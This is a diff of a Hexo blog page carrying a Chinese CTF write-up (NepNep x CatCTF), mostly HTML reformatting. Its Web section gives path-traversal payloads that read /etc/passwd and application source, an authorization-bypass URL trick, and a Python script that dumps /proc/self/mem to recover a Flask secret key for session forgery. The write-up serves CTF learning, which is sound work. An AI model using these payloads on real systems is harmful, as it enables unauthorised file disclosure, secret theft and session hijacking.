@@ -78,7 +78,8 @@
     
   </style>
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
 
 
 
@@ -177,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~4.24K
+                        ~4.15K
                     
                     字
                 </li>
@@ -202,76 +203,67 @@
             <hr />
             <div itemprop="articleBody"><p>又是被虐爆的一天，太难了</p>
 <span id="more"></span>
-
-<h2><span id="misc">Misc</span></h2><h3><span id="meowmeow">MeowMeow</span></h3><p>将图片拖入WinHex，会发现在文件的后半部分藏有flag</p>
+<h2><span id="misc"> Misc</span></h2>
+<h3><span id="meowmeow"> MeowMeow</span></h3>
+<p>将图片拖入WinHex，会发现在文件的后半部分藏有flag</p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/1.png" class title="awa">
-
-<h3><span id="nepnep-祝你新年快乐啦">Nepnep 祝你新年快乐啦</span></h3><p>评论区置顶评论：</p>
+<h3><span id="nepnep-祝你新年快乐啦"> Nepnep 祝你新年快乐啦</span></h3>
+<p>评论区置顶评论：</p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/2.png" class title="bwb">
-
-<h3><span id="catchcat">CatchCat</span></h3><p><a target="_blank" rel="noopener" href="https://www.gpsvisualizer.com/map_input">GPS Visualizer: Draw a map from a GPS data file</a></p>
+<h3><span id="catchcat"> CatchCat</span></h3>
+<p><a target="_blank" rel="noopener" href="https://www.gpsvisualizer.com/map_input">GPS Visualizer: Draw a map from a GPS data file</a></p>
 <p>通过这个绘制出猫猫的行动路径，即可获取flag</p>
-<p><del>（为什么这玩意这么难看，这两个题都是考眼力的）</del></p>
+<p><s>（为什么这玩意这么难看，这两个题都是考眼力的）</s></p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/3.png" class title="cwc">
-
-<h2><span id="crypto">Crypto</span></h2><h3><span id="cats-gift">Cat’s gift</span></h3><p><strong>将礼物分成了四份，说明结果需要乘4，其中一份是1-1&#x2F;3+1&#x2F;5-1&#x2F;7+….</strong></p>
+<h2><span id="crypto"> Crypto</span></h2>
+<h3><span id="cats-gift"> Cat’s gift</span></h3>
+<p><strong>将礼物分成了四份，说明结果需要乘4，其中一份是1-1/3+1/5-1/7+…</strong></p>
 <p>这个级数其实就是</p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/4.png" class title="dwd">
-
 <p>（大抵是这样）</p>
 <p>所以最后的值就是π（所以直接交pi是错的</p>
 <p>看到flag的格式都是食物，所以应该是派</p>
-<h2><span id="web">Web</span></h2><h3><span id="ez_js">ez_js</span></h3><p>直接进入**&#x2F;js&#x2F;game.js**</p>
+<h2><span id="web"> Web</span></h2>
+<h3><span id="ez_js"> ez_js</span></h3>
+<p>直接进入**/js/game.js**</p>
 <p>看到下面的函数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function get_flag()&#123;</span><br><span class="line">	alert(&quot;flag地址为/g3t_fl4g&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>访问&#x2F;g3t_fl4g即可</p>
-<h3><span id="ezbypass">ezbypass</span></h3><p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/387212.html">华夏ERP漏洞之授权绕过漏洞+后台命令执行漏洞&#x3D;未授权命令执行 | CN-SEC 中文网</a></p>
+<p>访问/g3t_fl4g即可</p>
+<h3><span id="ezbypass"> ezbypass</span></h3>
+<p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/387212.html">华夏ERP漏洞之授权绕过漏洞+后台命令执行漏洞=未授权命令执行 | CN-SEC 中文网</a></p>
 <p>参考这篇文章，可以绕过验证漏洞直接访问flag.html</p>
 <p>payload:</p>
-<p><strong>&#x2F;a.css&#x2F;..&#x2F;flag.html</strong></p>
-<p>或者**&#x2F;login.html&#x2F;..&#x2F;flag.html**</p>
+<p><strong>/a.css/…/flag.html</strong></p>
+<p>或者**/login.html/…/flag.html**</p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/5.png" class title="ewe">
-
-<h3><span id="catcat">Catcat</span></h3><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2070182">蓝帽杯 2022 web&#x2F;misc writeup - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<h3><span id="catcat"> Catcat</span></h3>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2070182">蓝帽杯 2022 web/misc writeup - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
 <p>进入靶机，点击猫猫</p>
 <p>可以看到url的变化，推测有目录穿越</p>
 <p>尝试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
 <p>成功，所以通过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../proc/self/cmdline</span><br></pre></td></tr></table></figure>
-
-<p>查看当前进程，回显app.py</p>
+<p>查看当前进程，<a target="_blank" rel="noopener" href="http://xn--app-4g6ey61e.py">回显app.py</a></p>
 <p>通过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../app/app.py</span><br></pre></td></tr></table></figure>
-
 <p>获取到源码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&amp;<span class="comment">#39;import os\nimport uuid\nfrom flask import Flask, request, session, render_template, Markup\nfrom cat import cat\n\nflag = &amp;#34;&amp;#34;\napp = Flask(\n    __name__,\n    static_url_path=\&amp;#39;/\&amp;#39;, \n    static_folder=\&amp;#39;static\&amp;#39; \n)\napp.config[\&amp;#39;SECRET_KEY\&amp;#39;] = str(uuid.uuid4()).replace(&amp;#34;-&amp;#34;, &amp;#34;&amp;#34;) + &amp;#34;*abcdefgh&amp;#34;\nif os.path.isfile(&amp;#34;/flag&amp;#34;):\n    flag = cat(&amp;#34;/flag&amp;#34;)\n    os.remove(&amp;#34;/flag&amp;#34;)\n\n@app.route(\&amp;#39;/\&amp;#39;, methods=[\&amp;#39;GET\&amp;#39;])\ndef index():\n    detailtxt = os.listdir(\&amp;#39;./details/\&amp;#39;)\n    cats_list = []\n    for i in detailtxt:\n        cats_list.append(i[:i.index(\&amp;#39;.\&amp;#39;)])\n        \n    return render_template(&amp;#34;index.html&amp;#34;, cats_list=cats_list, cat=cat)\n\n\n\n@app.route(\&amp;#39;/info\&amp;#39;, methods=[&amp;#34;GET&amp;#34;, \&amp;#39;POST\&amp;#39;])\ndef info():\n    filename = &amp;#34;./details/&amp;#34; + request.args.get(\&amp;#39;file\&amp;#39;, &amp;#34;&amp;#34;)\n    start = request.args.get(\&amp;#39;start\&amp;#39;, &amp;#34;0&amp;#34;)\n    end = request.args.get(\&amp;#39;end\&amp;#39;, &amp;#34;0&amp;#34;)\n    name = request.args.get(\&amp;#39;file\&amp;#39;, &amp;#34;&amp;#34;)[:request.args.get(\&amp;#39;file\&amp;#39;, &amp;#34;&amp;#34;).index(\&amp;#39;.\&amp;#39;)]\n    \n    return render_template(&amp;#34;detail.html&amp;#34;, catname=name, info=cat(filename, start, end))\n    \n\n\n@app.route(\&amp;#39;/admin\&amp;#39;, methods=[&amp;#34;GET&amp;#34;])\ndef admin_can_list_root():\n    if session.get(\&amp;#39;admin\&amp;#39;) == 1:\n        return flag\n    else:\n        session[\&amp;#39;admin\&amp;#39;] = 0\n        return &amp;#34;NoNoNo&amp;#34;\n\n\n\nif __name__ == \&amp;#39;__main__\&amp;#39;:\n    app.run(host=\&amp;#39;0.0.0.0\&amp;#39;, debug=False, port=5637)&amp;#39;</span></span><br></pre></td></tr></table></figure>
-
 <p>可以看到是flask（</p>
-<p>在&#x2F;admin路由内，如果session的admin&#x3D;1的话就会回显flag</p>
-<p>而通过burp抓包访问&#x2F;admin会回显set cookie: session…</p>
+<p>在/admin路由内，如果session的admin=1的话就会回显flag</p>
+<p>而通过burp抓包访问/admin会回显set cookie: session…</p>
 <p>所以应该是需要我们伪造一个session并且将设置的session修改掉</p>
 <p>伪造session需要知道SECRET_KEY</p>
 <p>这个思路在文章中有提及：</p>
 <p>通过<code>/proc/self/maps</code>读取堆栈分布，然后通过<code>/proc/self/mem</code>读取内存分布，获取secretkey</p>
-<p>这里使用thai大师傅的dump.py</p>
+<p><a target="_blank" rel="noopener" href="http://xn--thaidump-hu2mu8ft21bimnyi7eo8d9s4jesg.py">这里使用thai大师傅的dump.py</a></p>
 <p>先通过<code>?file=../../../../../../../../proc/self/maps</code>获取堆栈分布，将其内容复制并保存至source.txt</p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/6.png" class title="fwf">
-
 <p>然后使用dump.py获取secretkey：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re, time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://223.112.5.156:59441/&quot;</span></span><br><span class="line"><span class="comment"># maps_url = f&quot;&#123;url&#125;/info?file=/proc/self/maps&quot;</span></span><br><span class="line"></span><br><span class="line">maps_reg = <span class="string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;).*00000000 00:00 0&quot;</span></span><br><span class="line"><span class="comment"># maps = re.findall(maps_reg, requests.get(maps_url).text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;source.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    maps = re.findall(maps_reg, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(maps)</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> maps:</span><br><span class="line">    start, end = m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    Offset, Length = <span class="built_in">str</span>(<span class="built_in">int</span>(start, <span class="number">16</span>)), <span class="built_in">str</span>(<span class="built_in">int</span>(end, <span class="number">16</span>))</span><br><span class="line">    <span class="comment">#print(Offset,Length)</span></span><br><span class="line">    read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=../../../../../../../proc/self/mem&amp;start=<span class="subst">&#123;Offset&#125;</span>&amp;end=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">    s = requests.get(read_url).content</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    rt = re.findall(<span class="string">b&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, s)</span><br><span class="line">    <span class="keyword">if</span> rt:</span><br><span class="line">        <span class="built_in">print</span>(rt)</span><br></pre></td></tr></table></figure>
-
-
-
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/7.png" class title="gwg">
-
-
-
 <p>获取到secretkey后使用flask-session-cookie-manager即可</p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/8.png" class title="hwh">
-
 <p>最后修改cookie即可</p>
 <img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/9.png" class title="iwi">
 </div>
@@ -470,7 +462,7 @@
     <div class="photo-background"></div>
     <div class="photo-wrapper clearfix">
         <div class="photo-wrapper-tip text-center">
-            <img class="about-photo" src="/images/luo.webp" loading="lazy" decoding="auto" />
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
         </div>
     </div>
     <div class="textwidget">
